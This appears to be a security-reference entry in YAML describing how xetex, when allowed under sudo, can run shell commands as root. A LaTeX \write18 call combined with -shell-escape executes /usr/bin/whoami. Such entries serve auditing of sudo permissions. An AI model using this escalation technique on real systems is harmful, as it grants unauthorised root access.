functions:
  sudo:
    - code: |
        echo "\documentclass[12pt]{article} \begin{document} \immediate\write18{/usr/bin/whoami} \end{document}" > file.tex
        sudo xetex -interaction=nonstopmode -shell-escape file.tex
